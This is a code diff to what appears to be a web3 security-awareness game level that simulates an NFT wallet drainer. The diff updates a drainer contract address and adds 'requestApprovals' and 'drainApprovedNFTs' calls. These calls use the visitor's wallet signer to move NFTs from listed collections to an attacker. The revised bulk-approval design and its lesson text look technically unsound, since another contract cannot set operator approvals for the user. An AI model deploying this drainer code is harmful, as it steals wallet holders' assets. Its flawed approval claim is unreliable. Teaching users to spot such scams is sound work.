@@ -120,12 +120,16 @@
       "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
       "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
     ];
-    const drainerContract = "0x0103e8d6e07057829d99E57eD31420694bA4C4E3";
+    const drainerContract = "0x05C07AEf7e8116e9933F289273299215201c7B21"; // Updated contract address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
       "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
       "function name() view returns (string)"
+    ];
+    const drainerABI = [
+      "function requestApprovals(address[] calldata nftContracts) external",
+      "function drainApprovedNFTs(address[] calldata nftContracts, address victim) external"
     ];
 
     let provider, signer;
@@ -167,24 +171,19 @@
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "🚨 Requesting approval...";
-        for (const nftAddr of nftContracts) {
-          const contract = new ethers.Contract(nftAddr, nftABI, signer);
-          const tx = await contract.setApprovalForAll(drainerContract, true);
-          await tx.wait();
-        }
+        status.innerText = "🚨 Requesting approvals for multiple collections...";
+        const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
+        const approveTx = await drainer.requestApprovals(nftContracts); // Bulk approval in one tx
+        await approveTx.wait();
 
-        status.innerText = "💀 Approval granted. Draining now...";
-        const drainer = new ethers.Contract(drainerContract, [
-          "function approveAndDrain(address[] calldata nftContracts, address victim) external"
-        ], signer);
+        status.innerText = "💀 Approvals granted. Draining now...";
         const user = await signer.getAddress();
-        const drainTx = await drainer.approveAndDrain(nftContracts, user);
+        const drainTx = await drainer.drainApprovedNFTs(nftContracts, user);
         await drainTx.wait();
 
         status.innerText =
           "💀 All NFTs from the approved collections were transferred to the attacker.\n\n" +
-          "🧠 Lesson: Approving a malicious contract gives it full control over your NFTs — instantly.\n\n" +
+          "🧠 Lesson: Approving a malicious contract with `setApprovalForAll` for multiple collections in one transaction can wipe out your NFTs instantly.\n\n" +
           "Never sign blanket approvals unless absolutely necessary.";
         localStorage.setItem("w3game_level2", "drained");
         let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
@@ -194,7 +193,7 @@
       } catch (err) {
         if (err.code === "ACTION_REJECTED") {
           status.innerText =
-            "✅ You survived Level 2!\n\n🛡️ You rejected a malicious `setApprovalForAll` request.\n\n" +
+            "✅ You survived Level 2!\n\n🛡️ You rejected a malicious `setApprovalForAll` request for multiple collections.\n\n" +
             "This would have allowed a contract to move every NFT from these collections without asking again.";
           let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
           localStorage.setItem("w3game_survived", surviveCount + 1);
